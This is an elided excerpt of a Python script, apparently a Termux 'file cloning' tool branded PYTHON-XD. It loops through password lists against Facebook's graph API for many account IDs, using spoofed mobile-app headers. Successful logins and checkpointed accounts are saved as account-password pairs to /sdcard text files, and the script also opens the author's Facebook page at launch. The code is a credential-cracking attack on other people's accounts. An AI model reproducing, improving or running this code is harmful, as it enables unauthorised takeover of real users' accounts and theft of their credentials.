...
carr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','')
...
\033[92;1m18888b. db    db d888888b db   db  .d88b.  d8b   db   
\033[97;1m88  `8D `8b  d8' `~~88~~' 88   88 .8P  Y8. 888o  88  \033[92;1mVersion  : 0.0.1
\033[92;1m88oodD'  `8bd8'     88    88ooo88 88    88 88V8o 88 
\033[97;1m88~~~      88       88    88~~~88 88    88 88 V8o88    
\033[92;1m88         88       88    88   88 `8b  d8' 88  V888 
\033[97;1m88         YP       YP    YP   YP  `Y88P'  VP   V8P \033[97;1mXD
\033[97;1m[+]==============================================
         GITHUB : PYTHON-XD
         FB     : Muhammad Sajjad Lashari
\033[97;1m[+]=============================================="""
os.system("xdg-open https://www.facebook.com/uff.asta.cudo.bbu?mibextid=ZbWKwL")
NameX =input('\033[1;97m[+]\033[1;92m WHAT IS YOUR NAME \033[1;92m: \033[1;96m')

####@-----Menu-----@####
def Hxw_Main():
    os.system("clear")
    print(logo)
    print(f"{oo(1)}File Cloning 10089,10009")
...
def method():
  ...
  #  apps='y'
    ...
    print(logo) 
    print('\033[1;97m='*50)
    print(f'{oo("X")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('D')}Use flight mode for speed up")
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mPYTHON-XD-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mPYTHON-XD-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/PYTHON-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;97m[\033[1;97mPYTHON-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/PYTHON-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mPYTHON-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mPYTHON-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/PYTHON-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mPYTHON-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/PYTHON-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
